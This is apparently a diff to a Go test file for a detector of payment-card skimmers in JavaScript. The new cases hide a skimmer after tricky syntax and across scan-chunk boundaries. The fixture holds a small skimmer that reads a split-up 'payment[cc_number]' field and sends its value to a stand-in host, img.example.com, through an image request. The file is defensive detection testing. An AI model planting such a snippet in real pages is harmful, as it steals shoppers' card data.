@@ -216,12 +216,16 @@ func TestSkimmerAfterUncertainBrackets(t *testing.T) {
 	use := `var f=document.querySelector('[name="'+s+'"]');new Image().src="https://img.example.com/p?d="+f.value`
 	build := `var s='payment[c'+'c_n'+'umber]';`
 	for name, before := range map[string]string{
-		"ternary object":          "var q=1?0:{}/1;" + build + "var z=1/2;",
-		"class extends function":  "var q=class extends (function(){}){}/1;" + build + "var z=1/2;",
-		"return and a line break": "function g(){return\n{}/'/.test(1)};" + build,
-		"for await":               "async function h(){for await(const x of [])/'/.test(1)};" + build,
-		"template substitution":   "var t=`${1}'`;" + build + "var u=`'`;",
-		"template far before":     "var h=`${1}`;" + strings.Repeat("var a=1;", 700) + build,
+		"ternary object":                 "var q=1?0:{}/1;" + build + "var z=1/2;",
+		"class extends function":         "var q=class extends (function(){}){}/1;" + build + "var z=1/2;",
+		"return and a line break":        "function g(){return\n{}/'/.test(1)};" + build,
+		"for await":                      "async function h(){for await(const x of [])/'/.test(1)};" + build,
+		"template substitution":          "var t=`${1}'`;" + build + "var u=`'`;",
+		"template far before":            "var h=`${1}`;" + strings.Repeat("var a=1;", 700) + build,
+		"label in a function expression": "(function(){l:{}/'/.test(1);" + build + "\n})()",
+		"for's third clause":             "for(;0;{}/1);" + build + "var z=1/2;",
+		"of as a name":                   "var of=4;var q=of/2;" + build + "var z=1/2;",
+		"of and a line break":            "var of=1;of\n{}/'/.test(1);" + build,
 	} {
 		if skimmerSignals([]byte(before+use)) == nil {
 			t.Errorf("%s: not found", name)
@@ -235,5 +239,16 @@ func TestSkimmerAfterUncertainBrackets(t *testing.T) {
 	}
 	if fam.verdict() == nil {
 		t.Error("brackets across pieces: not found")
+	}
+	// A template whose text runs past where the next piece starts: read as code there, its "/*"
+	// would hide the skimmer after the end of the first piece.
+	src = []byte(strings.Repeat(" ", skimmerChunk-50) + "var t=`abc" + strings.Repeat("x", 100) + "/*`;" +
+		strings.Repeat("var a=1;", skimmerOverlap/8+64) + build + use + "/*x*/")
+	fam = skimmerFamilies{}
+	for off := 0; off < len(src); off += skimmerChunk {
+		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
+	}
+	if fam.verdict() == nil {
+		t.Error("template across pieces: not found")
 	}
 }
